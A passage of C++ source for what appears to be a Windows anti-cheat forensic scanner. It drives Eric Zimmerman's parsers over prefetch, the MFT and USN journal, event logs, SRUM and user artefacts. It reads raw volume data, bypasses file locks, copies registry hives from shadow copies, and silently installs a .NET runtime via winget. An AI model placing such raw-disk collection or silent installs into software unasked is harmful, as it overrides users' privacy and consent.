            if (first) { headers = row; first = false; continue; }

            string exeName = Get(row, Col(headers, "executablename"));
            if (exeName.empty()) exeName = Get(row, Col(headers, "sourcefile"));
            if (exeName.empty()) continue;

            // Only proceed if a keyword matches the exe name or resolved path.
            // Use whole-word matching (consistent with every other scan path) so
            // "wave" does NOT match "qwavecache.exe" or "shockwave.exe".
            string hitKw;
            for (auto& kw : KW) {
                if (MatchesWholeWord(Lower(exeName), kw)) { hitKw = kw; break; }
            }

            // Also check resolved path from FilesLoaded
            string filesLoaded = Get(row, Col(headers, "filesloaded"));
            string resolvedPath;
            string exeLow = Lower(exeName);
            if (!filesLoaded.empty()) {
                std::istringstream fss(filesLoaded);
                string token;
                while (std::getline(fss, token, ',')) {
                    size_t a = token.find_first_not_of(" \t");
                    if (a != string::npos) token = token.substr(a);
                    if (Lower(token).find(exeLow) != string::npos &&
                        Lower(token).find(".exe") != string::npos) {
                        size_t bs = token.find('\\', token.find('}'));
                        if (bs != string::npos)
                            resolvedPath = "C:" + token.substr(bs);
                        break;
                    }
                }
            }

            if (hitKw.empty()) {
                for (auto& kw : KW)
                    if (MatchesWholeWord(Lower(resolvedPath), kw)) { hitKw = kw; break; }
            }

            // No keyword match — skip entirely, no matter what the signature is
            if (hitKw.empty()) continue;

            flagged++;
            string lastRun = Get(row, Col(headers, "lastrun"));
            string runCount = Get(row, Col(headers, "runcount"));

            // Collect all previous run timestamps
            vector<string> prevRuns;
            for (int pr = 0; pr <= 6; pr++) {
                string col = "previousrun" + std::to_string(pr);
                string val = Get(row, Col(headers, col));
                if (!val.empty()) prevRuns.push_back(val);
            }

            // Signature check
            bool present = false;
            SigStatus sig = SigStatus::NotSigned;
            string signerInfo;
            if (!resolvedPath.empty()) {
                wstring wPath(resolvedPath.begin(), resolvedPath.end());
                present = (GetFileAttributesW(wPath.c_str()) != INVALID_FILE_ATTRIBUTES);
                if (present) sig = CheckSignature(wPath, &signerInfo);
            }

            string presenceStr = resolvedPath.empty() ? "Unknown (path not resolved)"
                : present ? "Yes" : "No (Deleted)";
            string sigStr = !resolvedPath.empty() && present ? SigStatusStr(sig)
                : resolvedPath.empty() ? "Unknown" : "N/A (not on disk)";

            // PE pattern scan on keyword hits (same as BAM)
            vector<string> patterns;
            if (present && sig != SigStatus::Signed && !resolvedPath.empty())
                patterns = ScanFileForCheats(resolvedPath);

            Log("============================================");
            Log("[HIT] Keyword    : " + hitKw);
            Log("      Tool       : PECmd.exe (Prefetch)");
            Log("      Executable : " + exeName);
            if (!resolvedPath.empty()) Log("      Path       : " + resolvedPath);
            Log("      Present    : " + presenceStr);
            Log("      Signature  : " + sigStr);
            if (!signerInfo.empty()) Log("      Signer     : " + signerInfo);
            if (!lastRun.empty())  Log("      Last Run   : " + lastRun);
            if (!runCount.empty()) Log("      Run Count  : " + runCount);
            if (!prevRuns.empty()) {
                Log("      Prev Runs  : " + std::to_string(prevRuns.size()) + " recorded");
                for (auto& pr : prevRuns)
                    Log("                   - " + pr);
            }
            if (!patterns.empty()) {
                Log("      PE Patterns: " + std::to_string(patterns.size()) + " hit(s)");
                for (auto& p : patterns)
                    Log("                   - " + p);
            }
            Log("============================================");
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);

    Log("  [~] Prefetch keyword scan: " + std::to_string(flagged) + " hit(s)");
}

static void RunPECmd(const wstring& exe, const wstring& out) {
    wstring cmd = L"\"" + exe + L"\" -d C:\\Windows\\Prefetch --csv \"" + out + L"\" -q";
    Log("  [cmd] " + WtoS(cmd.c_str()));
    string o = Capture(cmd);
    if (!o.empty()) Log("  [out] " + o.substr(0, 5000));
    ScanPrefetchKeywords(out);
}

static void RunMFTECmd(const wstring& exe, const wstring& out, const wstring& vss) {
    auto tryMFT = [&](const wstring& cmd, const wstring& label) -> bool {
        Log("  [cmd] " + WtoS(cmd.c_str()));
        RunDetached(cmd, 900000);
        WIN32_FIND_DATAW fd2;
        HANDLE hCheck = FindFirstFileW((out + L"\\*.csv").c_str(), &fd2);
        if (hCheck != INVALID_HANDLE_VALUE) {
            FindClose(hCheck);
            Log("  [+] " + WtoS(label.c_str()) + " succeeded");
            return true;
        }
        Log("  [~] " + WtoS(label.c_str()) + " produced no CSV");
        return false;
        };

    // ── Pass 1: $MFT ─────────────────────────────────────────────────────────
    // Try three methods in order. The old code did `if (tryMFT) return` which
    // caused the $J block below to be permanently unreachable on any normal
    // machine where live $MFT parsing succeeds. Fixed: track success in a bool
    // and always fall through to the $J pass.
    bool mftDone = false;

    Log("  [*] Trying MFTECmd on live C:\\$MFT ...");
    if (tryMFT(L"\"" + exe + L"\" -f \"C:\\$MFT\" --csv \"" + out + L"\" --csvf mft.csv", L"live $MFT"))
        mftDone = true;

    if (!mftDone && !vss.empty()) {
        Log("  [*] Trying MFTECmd with --vss flag ...");
        if (tryMFT(L"\"" + exe + L"\" -f \"C:\\$MFT\" --vss --csv \"" + out + L"\" --csvf mft.csv", L"--vss"))
            mftDone = true;
    }

    if (!mftDone) {
        wstring mftDst = TmpDir() + L"HubChk_MFT";
        Log("  [*] Opening volume for raw MFT extraction ...");
        HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
        if (hVol == INVALID_HANDLE_VALUE) { Log("  [!] Cannot open volume"); }
        else {
            NTFS_VOLUME_DATA_BUFFER nvd = {}; DWORD returned = 0;
            if (!DeviceIoControl(hVol, FSCTL_GET_NTFS_VOLUME_DATA, nullptr, 0, &nvd, sizeof(nvd), &returned, nullptr)) {
                Log("  [!] FSCTL failed"); CloseHandle(hVol);
            }
            else {
                CloseHandle(hVol);
                LONGLONG mftOffset = nvd.MftStartLcn.QuadPart * nvd.BytesPerCluster;
                LONGLONG mftSize = nvd.MftValidDataLength.QuadPart;
                DWORD    sectorSz = nvd.BytesPerSector ? nvd.BytesPerSector : 512;
                Log("  [+] MFT: offset=" + std::to_string(mftOffset) + " size=" + std::to_string(mftSize));

                hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    nullptr, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING, nullptr);
                if (hVol == INVALID_HANDLE_VALUE) { Log("  [!] Cannot open volume (raw)"); }
                else {
                    LARGE_INTEGER li; li.QuadPart = mftOffset;
                    if (!SetFilePointerEx(hVol, li, nullptr, FILE_BEGIN)) {
                        Log("  [!] Seek failed"); CloseHandle(hVol);
                    }
                    else {
                        HANDLE hDst = CreateFileW(mftDst.c_str(), GENERIC_WRITE, 0,
                            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                        if (hDst != INVALID_HANDLE_VALUE) {
                            const DWORD CHUNK = 4 * 1024 * 1024;
                            vector<char> rawbuf(CHUNK);
                            LONGLONG remaining = mftSize, written = 0;
                            while (remaining > 0) {
                                LONGLONG want = (remaining < (LONGLONG)CHUNK) ? remaining : (LONGLONG)CHUNK;
                                DWORD toRead = (DWORD)(((want + sectorSz - 1) / sectorSz) * sectorSz);
                                DWORD r = 0;
                                if (!ReadFile(hVol, rawbuf.data(), toRead, &r, nullptr) || r == 0) break;
                                DWORD toWrite = (DWORD)want; DWORD w = 0;
                                if (!WriteFile(hDst, rawbuf.data(), toWrite, &w, nullptr) || w != toWrite) break;
                                written += w; remaining -= w;
                            }
                            FlushFileBuffers(hDst); CloseHandle(hDst);
                            if (written == 0) {
                                DeleteFileW(mftDst.c_str()); Log("  [!] Zero bytes written");
                            }
                            else {
                                Log("  [+] Raw MFT: " + std::to_string(written) + " bytes");
                                wstring rawCmd = L"\"" + exe + L"\" -f \"" + mftDst +
                                    L"\" --csv \"" + out + L"\" --csvf mft.csv";
                                Log("  [cmd] " + WtoS(rawCmd.c_str()));
                                string o2 = Capture(rawCmd);
                                if (!o2.empty()) Log("  [out] " + o2.substr(0, 1000));
                                DeleteFileW(mftDst.c_str());
                                mftDone = true;
                            }
                        }
                        CloseHandle(hVol);
                    }
                }
            }
        }
    }

    if (!mftDone)
        Log("  [!] All MFT methods failed - $MFT CSV will be missing");

    // ── Pass 2: $J (USN Journal via MFTECmd) ─────────────────────────────────
    // MFTECmd cannot open $UsnJrnl:$J directly — it is a sparse ADS of a locked
    // NTFS metadata file and Win32 CreateFile fails with ERROR_SHARING_VIOLATION
    // or ERROR_ACCESS_DENIED.  Fix: copy the stream to a flat temp file first
    // (same approach as the USN carver), then point MFTECmd at the copy.
    Log("  [*] Running: MFTECmd.exe ($J - USN Journal)");
    {
        wstring jCopyPath = TmpDir() + L"HubChk_J_mfte";
        HANDLE hJ = INVALID_HANDLE_VALUE;

        // Method 1: device namespace + full ADS name
        hJ = CreateFileW(L"\\\\.\\C:\\$Extend\\$UsnJrnl:$J", GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN, nullptr);
        if (hJ != INVALID_HANDLE_VALUE)
            Log("  [+] $J opened via device namespace");

        // Method 2: NtCreateFile with NT path
        if (hJ == INVALID_HANDLE_VALUE && pNtCreateFile && pRtlInitUnicodeString) {
            wstring ntJPath = L"\\??\\C:\\$Extend\\$UsnJrnl:$J";
            UNICODE_STRING uJPath = {};
            pRtlInitUnicodeString(&uJPath, ntJPath.c_str());
            OBJECT_ATTRIBUTES oaJ = {};
            oaJ.Length = sizeof(oaJ);
            oaJ.ObjectName = &uJPath;
            oaJ.Attributes = OBJ_CASE_INSENSITIVE;
            IO_STATUS_BLOCK iosbJ = {};
            NTSTATUS stJ = pNtCreateFile(&hJ,
                FILE_READ_DATA | SYNCHRONIZE,
                &oaJ, &iosbJ, nullptr, 0,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                FILE_OPEN,
                FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE | FILE_SEQUENTIAL_ONLY,
                nullptr, 0);
            if (!NT_SUCCESS(stJ)) hJ = INVALID_HANDLE_VALUE;
            else Log("  [+] $J opened via NtCreateFile");
        }

        // Method 3: Win32 ADS path
        if (hJ == INVALID_HANDLE_VALUE) {
            hJ = CreateFileW(L"C:\\$Extend\\$UsnJrnl:$J", GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING,
                FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN, nullptr);
            if (hJ != INVALID_HANDLE_VALUE)
                Log("  [+] $J opened via Win32 ADS path");
        }

        // Method 4: VSS snapshot fallback
        if (hJ == INVALID_HANDLE_VALUE && !vss.empty()) {
            wstring vssSrc = vss + L"\\$Extend\\$UsnJrnl:$J";
            HANDLE hProbe = CreateFileW(vssSrc.c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
            if (hProbe != INVALID_HANDLE_VALUE) {
                CloseHandle(hProbe);
                if (CopyFromVss(vss, L"$Extend\\$UsnJrnl:$J", jCopyPath)) {
                    hJ = CreateFileW(jCopyPath.c_str(), GENERIC_READ,
                        FILE_SHARE_READ, nullptr, OPEN_EXISTING,
                        FILE_FLAG_SEQUENTIAL_SCAN, nullptr);
                    if (hJ != INVALID_HANDLE_VALUE)
                        Log("  [+] $J opened via VSS copy");
                    else
                        DeleteFileW(jCopyPath.c_str());
                }
            }
        }

        // Method 5: FSCTL_READ_USN_JOURNAL dump from live volume.
        // Opening $UsnJrnl:$J as a file fails with ERROR_ACCESS_DENIED (err 5)
        // on many Windows 10/11 builds even as admin because the NTFS kernel
        // holds the stream exclusively.  However, opening the volume device
        // (\\.\C:) and issuing FSCTL_READ_USN_JOURNAL works fine — it is exactly
        // what the native USN scanner uses.  We stream the raw USN_RECORD binary
        // into a flat temp file; MFTECmd parses this format correctly since the
        // packed USN_RECORD_V2/V3 stream is structurally identical to $J.
        if (hJ == INVALID_HANDLE_VALUE) {
            HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, 0, nullptr);
            if (hVol != INVALID_HANDLE_VALUE) {
                USN_JOURNAL_DATA_V0 jd = {};
                DWORD jdBytes = 0;
                if (DeviceIoControl(hVol, FSCTL_QUERY_USN_JOURNAL,
                    nullptr, 0, &jd, sizeof(jd), &jdBytes, nullptr)) {
                    HANDLE hDst = CreateFileW(jCopyPath.c_str(), GENERIC_WRITE, 0,
                        nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                    if (hDst != INVALID_HANDLE_VALUE) {
                        READ_USN_JOURNAL_DATA_V0 rd = {};
                        rd.StartUsn = jd.FirstUsn;
                        rd.ReasonMask = 0xFFFFFFFF;
                        rd.ReturnOnlyOnClose = 0;
                        rd.Timeout = 0;
                        rd.BytesToWaitFor = 0;
                        rd.UsnJournalID = jd.UsnJournalID;
                        vector<BYTE> jBuf(65536 + 8);
                        ULONGLONG totalWritten = 0;
                        while (true) {
                            DWORD got = 0;
                            if (!DeviceIoControl(hVol, FSCTL_READ_USN_JOURNAL,
                                &rd, sizeof(rd), jBuf.data(), (DWORD)jBuf.size(),
                                &got, nullptr))
                                break;
                            // First 8 bytes of output are NextUsn, not record data
                            if (got <= 8) break;
                            DWORD recBytes = got - 8;
                            DWORD w = 0;
                            WriteFile(hDst, jBuf.data() + 8, recBytes, &w, nullptr);
                            totalWritten += w;
                            USN nextUsn = *(USN*)jBuf.data();
                            if (nextUsn == rd.StartUsn) break;  // no progress
                            rd.StartUsn = nextUsn;
                        }
                        CloseHandle(hDst);
                        if (totalWritten > 0) {
                            hJ = CreateFileW(jCopyPath.c_str(), GENERIC_READ,
                                FILE_SHARE_READ, nullptr, OPEN_EXISTING,
                                FILE_FLAG_SEQUENTIAL_SCAN, nullptr);
                            if (hJ != INVALID_HANDLE_VALUE)
                                Log("  [+] $J extracted via FSCTL dump ("
                                    + std::to_string(totalWritten) + " bytes)");
                            else
                                DeleteFileW(jCopyPath.c_str());
                        }
                        else {
                            DeleteFileW(jCopyPath.c_str());
                            Log("  [!] $J FSCTL dump wrote 0 bytes");
                        }
                    }
                }
                CloseHandle(hVol);
            }
        }

        if (hJ == INVALID_HANDLE_VALUE) {
            Log("  [!] Cannot open $J for MFTECmd - all methods failed (err "
                + std::to_string(GetLastError()) + ")");
            Log("  [~] USN CSV via MFTECmd skipped");
        }
        else {
            // If the temp file doesn't already exist (i.e. not from VSS copy path),
            // stream the open handle out to a flat file MFTECmd can read normally.
            bool needsDelete = true;
            if (GetFileAttributesW(jCopyPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                HANDLE hDst = CreateFileW(jCopyPath.c_str(), GENERIC_WRITE, 0,
                    nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                if (hDst == INVALID_HANDLE_VALUE) {
                    Log("  [!] Cannot create $J temp file (err "
                        + std::to_string(GetLastError()) + ")");
                    CloseHandle(hJ);
                    hJ = INVALID_HANDLE_VALUE;
                }
                else {
                    bool ok = StreamCopy(hJ, hDst);
                    CloseHandle(hDst);
                    CloseHandle(hJ);
                    hJ = INVALID_HANDLE_VALUE;
                    if (!ok) {
                        DeleteFileW(jCopyPath.c_str());
                        needsDelete = false;
                        Log("  [!] $J stream copy failed");
                    }
                    else {
                        LARGE_INTEGER sz = {};
                        HANDLE hsz = CreateFileW(jCopyPath.c_str(), GENERIC_READ,
                            FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
                        if (hsz != INVALID_HANDLE_VALUE) {
                            GetFileSizeEx(hsz, &sz); CloseHandle(hsz);
                        }
                        Log("  [+] $J copied: " + std::to_string(sz.QuadPart) + " bytes");
                    }
                }
            }
            else {
                // Already written by VSS copy path above
                if (hJ != INVALID_HANDLE_VALUE) { CloseHandle(hJ); hJ = INVALID_HANDLE_VALUE; }
            }

            if (GetFileAttributesW(jCopyPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                wstring jCmd = L"\"" + exe + L"\" -f \"" + jCopyPath
                    + L"\" --csv \"" + out + L"\" --csvf usn.csv --fua";
                Log("  [cmd] " + WtoS(jCmd.c_str()));
                RunDetached(jCmd, 900000);
                if (needsDelete) DeleteFileW(jCopyPath.c_str());

                WIN32_FIND_DATAW fd3;
                HANDLE hCheck = FindFirstFileW((out + L"\\usn*.csv").c_str(), &fd3);
                if (hCheck != INVALID_HANDLE_VALUE) {
                    FindClose(hCheck);
                    Log("  [+] MFTECmd $J CSV produced successfully");
                }
                else {
                    Log("  [~] MFTECmd produced no USN CSV despite valid $J copy");
                }
            }
        }
    }
}
static void RunJLECmd(const wstring& exe, const wstring& out) {
    auto users = EnumUsers();
    if (users.empty()) { Log("  [!] No user profiles found"); return; }

    const wchar_t* subdirs[] = { L"AutomaticDestinations", L"CustomDestinations", nullptr };
    bool anyRan = false;
    for (auto& user : users) {
        for (int i = 0; subdirs[i]; i++) {
            wstring dir = L"C:\\Users\\" + user + L"\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\" + subdirs[i];
            if (GetFileAttributesW(dir.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
            wstring cmd = L"\"" + exe + L"\" -d \"" + dir + L"\" --csv \"" + out + L"\" -q";
            Log("  [cmd] " + WtoS(cmd.c_str()) + " [user: " + WtoS(user.c_str()) + "]");
            string o = Capture(cmd);
            if (!o.empty()) Log("  [out] " + o.substr(0, 5000));
            anyRan = true;
        }
    }
    if (!anyRan) Log("  [!] No JumpList directories found for any user");
}

static void RunLECmd(const wstring& exe, const wstring& out) {
    auto users = EnumUsers();
    if (users.empty()) { Log("  [!] No user profiles found"); return; }

    bool anyRan = false;
    for (auto& user : users) {
        vector<wstring> lnkDirs = {
            L"C:\\Users\\" + user + L"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            L"C:\\Users\\" + user + L"\\Desktop",
        };
        for (auto& dir : lnkDirs) {
            if (GetFileAttributesW(dir.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
            wstring cmd = L"\"" + exe + L"\" -d \"" + dir + L"\" --csv \"" + out + L"\" -q";
            Log("  [cmd] " + WtoS(cmd.c_str()) + " [user: " + WtoS(user.c_str()) + "]");
            string o = Capture(cmd);
            if (!o.empty()) Log("  [out] " + o.substr(0, 5000));
            anyRan = true;
        }
    }
    if (!anyRan) Log("  [!] No LNK directories found for any user");
}

static void RunRBCmd(const wstring& exe, const wstring& out) {
    wstring cmd = L"\"" + exe + L"\" -d \"C:\\$Recycle.Bin\" --csv \"" + out + L"\" -q";
    Log("  [cmd] " + WtoS(cmd.c_str()));
    string o = Capture(cmd);
    if (!o.empty()) Log("  [out] " + o.substr(0, 5000));
}

static void RunSBECmd(const wstring& exe, const wstring& out) {
    wstring cmd = L"\"" + exe + L"\" -l --csv \"" + out + L"\"";
    Log("  [cmd] " + WtoS(cmd.c_str()));
    string o = Capture(cmd);
    if (!o.empty()) Log("  [out] " + o.substr(0, 5000));
}

static void RunEvtxECmd(const wstring& exe, const wstring& out) {
    wstring evtxDir = L"C:\\Windows\\System32\\winevt\\Logs";

    wstring exeDir = exe.substr(0, exe.rfind(L'\\'));
    wstring mapsInExeDir = exeDir + L"\\Maps";
    bool mapsExtracted = false;  // true = we created Maps, so we clean up after

    if (GetFileAttributesW(mapsInExeDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
        wchar_t selfPath[MAX_PATH]; GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
        wstring selfDir(selfPath); selfDir = selfDir.substr(0, selfDir.rfind(L'\\'));
        vector<wstring> mapsSearchPaths = {
            selfDir + L"\\Maps",
            selfDir + L"\\EvtxECmd\\Maps",
            L"C:\\Tools\\EvtxECmd\\Maps",
            L"C:\\Tools\\Maps"
        };
        for (auto& mp : mapsSearchPaths) {
            if (GetFileAttributesW(mp.c_str()) != INVALID_FILE_ATTRIBUTES) {
                Log("  [+] Found Maps at: " + WtoS(mp.c_str()));
                CreateDirectoryW(mapsInExeDir.c_str(), nullptr);
                WIN32_FIND_DATAW mfd;
                HANDLE mh = FindFirstFileW((mp + L"\\*").c_str(), &mfd);
                if (mh != INVALID_HANDLE_VALUE) {
                    do {
                        if (mfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                        wstring msrc = mp + L"\\" + mfd.cFileName;
                        wstring mdst = mapsInExeDir + L"\\" + mfd.cFileName;
                        CopyFileW(msrc.c_str(), mdst.c_str(), FALSE);
                    } while (FindNextFileW(mh, &mfd));
                    FindClose(mh);
                }
                Log("  [+] Maps copied to exe dir");
                mapsExtracted = true;
                break;
            }
        }
        if (GetFileAttributesW(mapsInExeDir.c_str()) == INVALID_FILE_ATTRIBUTES) {
            // Try embedded Maps before giving up
            if (g_embeddedMapCount > 0) {
                CreateDirectoryW(mapsInExeDir.c_str(), nullptr);
                int mExtracted = 0;
                for (int m = 0; m < g_embeddedMapCount; m++) {
                    const EmbeddedMap& em = g_embeddedMaps[m];
                    wstring mdst = mapsInExeDir + L"\\" + em.filename;
                    if (GetFileAttributesW(mdst.c_str()) == INVALID_FILE_ATTRIBUTES) {
                        HANDLE hf = CreateFileW(mdst.c_str(), GENERIC_WRITE, 0,
                            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                        if (hf != INVALID_HANDLE_VALUE) {
                            DWORD w = 0;
                            WriteFile(hf, em.data, (DWORD)em.size, &w, nullptr);
                            CloseHandle(hf);
                            mExtracted++;
                        }
                    }
                }
                Log("  [+] Extracted " + std::to_string(mExtracted) + " embedded map(s)");
                mapsExtracted = true;
            }
            else {
                Log("  [!] Maps folder not found - event descriptions will be blank.");
                Log("  [!] Place the Maps\\ folder from the EZ Tools EvtxECmd package next to HubChecker.exe.");
            }
        }
    }
    else {
        Log("  [+] Maps folder present alongside exe");
    }

    auto hasCSV = [&]() -> bool {
        WIN32_FIND_DATAW fd;
        HANDLE h = FindFirstFileW((out + L"\\*.csv").c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) return false;
        FindClose(h); return true;
        };

    bool mapsPresent = (GetFileAttributesW(mapsInExeDir.c_str()) != INVALID_FILE_ATTRIBUTES);

    if (mapsPresent) {
        // FIX: removed -q so EvtxECmd emits output even when --inc yields nothing,
        // and switched from RunDetached (output discarded to NUL) to Capture so the
        // result is logged and we can diagnose why no CSV was produced.
        wstring cmd = L"\"" + exe + L"\" -d \"" + evtxDir + L"\" --csv \"" + out + L"\""
            L" --inc 4688,7045,4697,4698,4699,4700,4701,4702,1102,104";
        Log("  [cmd] " + WtoS(cmd.c_str()));
        string filtOut = Capture(cmd);
        // Strip benign EvtxECmd noise lines before logging:
        //   "Warning! Time just went backwards!" - a known harmless quirk when event timestamps
        //     are slightly out-of-order (e.g. DST transitions, VM clock drift).
        //   "Flags: IsDirty" and partial "Chunk co..." - internal log-state lines that appear
        //     when EvtxECmd opens an in-use log via rerouting and are not actionable.
        if (!filtOut.empty()) {
            std::istringstream ess(filtOut); string cleaned, ln;
            while (std::getline(ess, ln)) {
                if (!ln.empty() && ln.back() == '\r') ln.pop_back();
                if (ln.find("Time just went backwards") != string::npos) continue;
                if (ln.find("Flags: IsDirty") != string::npos) continue;
                if (ln.find("Chunk co") != string::npos && ln.size() < 20) continue;
                cleaned += ln; cleaned += '\n';
            }
            if (!cleaned.empty()) Log("  [out] " + cleaned.substr(0, 800));
        }
        if (hasCSV()) return;
        Log("  [~] No CSV from filtered run - retrying without --inc filter ...");
    }

    wstring cmd = L"\"" + exe + L"\" -d \"" + evtxDir + L"\" --csv \"" + out + L"\"";
    Log("  [cmd] " + WtoS(cmd.c_str()));
    string o = Capture(cmd);
    if (!o.empty()) Log("  [out] " + o.substr(0, 800));

    if (hasCSV())
        Log(mapsPresent ? "  [+] Fallback succeeded - all event IDs scanned"
            : "  [+] Scan complete - all event IDs scanned (no Maps = descriptions blank)");
    else
        Log("  [!] EvtxECmd produced no output - Maps folder likely missing");

    // Clean up Maps we extracted (embedded or copied from disk)
    if (mapsExtracted && GetFileAttributesW(mapsInExeDir.c_str()) != INVALID_FILE_ATTRIBUTES) {
        WIN32_FIND_DATAW mfd2;
        HANDLE mh2 = FindFirstFileW((mapsInExeDir + L"\\*").c_str(), &mfd2);
        if (mh2 != INVALID_HANDLE_VALUE) {
            do {
                if (!(mfd2.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
                    DeleteFileW((mapsInExeDir + L"\\" + mfd2.cFileName).c_str());
            } while (FindNextFileW(mh2, &mfd2));
            FindClose(mh2);
        }
        RemoveDirectoryW(mapsInExeDir.c_str());
        Log("  [+] Maps folder cleaned up");
    }
}

static void RunRecentFileCache(const wstring& exe, const wstring& out, const wstring& vss) {
    wstring src = L"C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf";
    wstring dst = TmpDir() + L"RecentFileCache.bcf";
    bool ok = false;

    // RecentFileCache.bcf does not exist on Windows 8+ systems (superseded by Amcache.hve).
    // Silently try VSS then direct copy; if neither succeeds, emit a single clean message.
    if (!vss.empty()) {
        Log("  [*] Copying RecentFileCache.bcf from VSS ...");
        // Suppress the CopyFromVss error log for this path — the file simply may not exist.
        wstring vssSrc = vss + L"\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf";
        HANDLE hTest = CreateFileW(vssSrc.c_str(), GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
        if (hTest != INVALID_HANDLE_VALUE) {
            CloseHandle(hTest);
            ok = CopyFromVss(vss, L"Windows\\AppCompat\\Programs\\RecentFileCache.bcf", dst);
        }
    }
    if (!ok) {
        // Check live path quietly before calling CopyLockedFile to avoid noisy error lines.
        if (GetFileAttributesW(src.c_str()) != INVALID_FILE_ATTRIBUTES) {
            Log("  [*] Copying RecentFileCache.bcf directly ...");
            ok = CopyLockedFile(src, dst);
        }
    }
    if (!ok) {
        Log("  [!] RecentFileCache.bcf not present on this system (replaced by Amcache.hve on Windows 8+)");
        return;
    }

    wstring cmd = L"\"" + exe + L"\" -f \"" + dst + L"\" --csv \"" + out + L"\"";
    Log("  [cmd] " + WtoS(cmd.c_str()));
    string o = Capture(cmd);
    if (!o.empty()) Log("  [out] " + o.substr(0, 5000));
    DeleteFileW(dst.c_str());
}

static void RunSrumECmd(const wstring& exe, const wstring& out, const wstring& vss) {
    wstring dst = TmpDir() + L"SRUDB.dat";
    wstring softDst = TmpDir() + L"SOFTWARE_srum";
    bool ok = false;

    if (!vss.empty()) {
        Log("  [*] Copying SRUDB.dat from VSS ...");
        ok = CopyFromVss(vss, L"Windows\\System32\\sru\\SRUDB.dat", dst);
        if (ok) {
            Log("  [*] Copying SOFTWARE hive from VSS (for AppID resolution) ...");
            CopyFromVss(vss, L"Windows\\System32\\config\\SOFTWARE", softDst);
        }
    }
    if (!ok) {
        Log("  [*] Copying SRUDB.dat directly ...");
        ok = CopyLockedFile(L"C:\\Windows\\System32\\sru\\SRUDB.dat", dst);
    }
    if (!ok) { Log("  [!] Could not copy SRUDB.dat"); return; }

    wstring cmd = L"\"" + exe + L"\" -f \"" + dst + L"\" --csv \"" + out + L"\"";
    if (GetFileAttributesW(softDst.c_str()) != INVALID_FILE_ATTRIBUTES)
        cmd += L" -r \"" + softDst + L"\"";
    Log("  [cmd] " + WtoS(cmd.c_str()));
    string o = Capture(cmd);
    // SrumECmd emits a non-fatal exception when the Push Notification table is absent
    // (common on machines where push notification services have never run).  The table
    // miss is reported cleanly in the counts section (Push Notification count: 0) so the
    // exception block adds no diagnostic value.  Strip it before logging.
    if (!o.empty()) {
        std::istringstream sss(o); string cleaned2, ln2;
        while (std::getline(sss, ln2)) {
            if (!ln2.empty() && ln2.back() == '\r') ln2.pop_back();
            if (ln2.find("Error processing Push Notification") != string::npos) continue;
            if (ln2.find("Microsoft.Isam.Esent") != string::npos) continue;
            if (ln2.find("EsentObjectNotFoundException") != string::npos) continue;
            if (ln2.find("konum:") != string::npos) continue;
            if (ln2.find("   at ") != string::npos) continue;
            if (ln2.find("SrumData.Srum.") != string::npos) continue;
            cleaned2 += ln2; cleaned2 += '\n';
        }
        if (!cleaned2.empty()) Log("  [out] " + cleaned2.substr(0, 3000));
    }

    DeleteFileW(dst.c_str());
    if (GetFileAttributesW(softDst.c_str()) != INVALID_FILE_ATTRIBUTES)
        DeleteFileW(softDst.c_str());
}

static void RunWxTCmd(const wstring& exe, const wstring& out) {
    {
        string dotnetCheck = Capture(L"dotnet --list-runtimes");
        bool hasDotNet9 = (dotnetCheck.find("Microsoft.NETCore.App 9.") != string::npos);
        if (!hasDotNet9) {
            Log("  [!] WxTCmd requires .NET 9 runtime which is not installed.");
            Log("  [*] Attempting to auto-install .NET 9 runtime via winget ...");
            // FIX: instead of immediately bailing out, try a silent winget install.
            // winget is available on Windows 10 1709+ and all Windows 11 builds.
            // --accept-* flags suppress the EULA prompts so no user interaction is needed.
            Capture(
                L"winget install Microsoft.DotNet.Runtime.9 "
                L"--accept-source-agreements --accept-package-agreements --silent"
            );
            // Re-check: if winget succeeded the runtime should now be visible.
            dotnetCheck = Capture(L"dotnet --list-runtimes");
